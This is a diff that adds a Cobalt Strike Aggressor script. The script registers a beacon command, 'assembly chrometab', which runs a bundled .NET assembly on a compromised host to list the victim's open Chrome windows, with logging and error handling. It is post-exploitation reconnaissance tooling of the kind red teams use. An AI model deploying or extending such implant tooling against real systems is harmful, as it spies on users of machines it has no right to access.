@@ -1,0 +1,66 @@
+#	ALIAS:	CHROMETAB
+
+alias("assembly chrometab", {
+
+		# Check for Number of Arguements
+		if (size(@_) > 2) {
+			berror($1, "chrometab: Too many arguments");
+			beacon_command_detail("chrometab");
+			return;
+		}
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Enumerating any Open Chrome Windows ]");
+			
+			# Beginning Task
+			btask($1, "Enumerating any Open Chrome Windows (MITRE ATTACK ID)", "T000");
+			
+			# Log Tasking to Event Log.
+			elog("\cC[+] Enumerating any Open Chrome Windows on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+			# Print Information to Script Console.
+			println(
+				"\nPRINTED INFORMATION: CHROMETAB => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nEnumerating any Open Chrome Windows."
+			);
+			
+			# Print Results to Beacon Console.
+			if (-is64 $1) {
+				if ("x86" !isin beacon_info($1, "barch")) {
+					bexecute_assembly($1, script_resource("_assemblies/chrometab/chrometab_x64_4.0.30319.exe"), $null);
+				}
+				else {
+					bexecute_assembly($1, script_resource("_assemblies/chrometab/chrometab_x86_4.0.30319.exe"), $null);
+				}
+				
+			}
+			else {
+				bexecute_assembly($1, script_resource("_assemblies/chrometab/chrometab_x86_4.0.30319.exe"), $null);
+			}
+			# Task Complete
+			
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: CHROMETAB => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\nCHROMETAB: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "CHROMETAB: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: CHROMETAB
+beacon_command_register(
+	"assembly chrometab",
+	"\cD" . "[*] .NET \(4.0\): Enumerates any open chrome windows" . "\o",
+	"Synopsis: chrometab\n\Enumerates any open chrome windows."
+ );
